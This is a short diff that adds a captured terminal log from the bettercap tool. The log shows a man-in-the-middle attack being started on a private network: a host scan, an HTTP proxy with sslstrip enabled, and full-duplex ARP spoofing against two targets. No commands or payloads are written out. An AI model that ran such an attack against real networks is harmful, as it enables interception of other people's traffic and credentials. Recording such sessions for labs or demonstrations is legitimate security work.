@@ -1,0 +1,9 @@
+[1mbettercap v2.32.0[0m [2m(built for linux amd64 with go1.18.4)[0m [type '[1mhelp[0m' for a list of commands]
+
+[23:05:36] [[32msys.log[0m] [[97m[42minf[0m] gateway monitor started ...
+[23:05:36] [[32msys.log[0m] [[97m[42minf[0m] [104m[30mnet.probe[0m[0m starting net.recon as a requirement for net.probe
+[23:05:36] [[32msys.log[0m] [[97m[42minf[0m] [104m[30mnet.probe[0m[0m probing 256 addresses on 192.168.247.0/24
+[23:05:36] [[32mendpoint.new[0m] endpoint [1m192.168.247.232[0m[2m[0m detected as [32m00:f4:8d:a8:22:9d[0m[2m (Liteon Technology Corporation)[0m.
+[23:05:36] [[32msys.log[0m] [[97m[42minf[0m] [104m[30mhttp.proxy[0m[0m started on 192.168.247.243:8080 (sslstrip [33menabled[0m)
+[23:05:36] [[32msys.log[0m] [[97m[42minf[0m] [104m[30marp.spoof[0m[0m arp spoofer started, probing 2 targets.
+[23:05:36] [[32msys.log[0m] [[97m[43mwar[0m] [104m[30marp.spoof[0m[0m full duplex spoofing enabled, if the router has ARP spoofing mechanisms, the attack will fail.
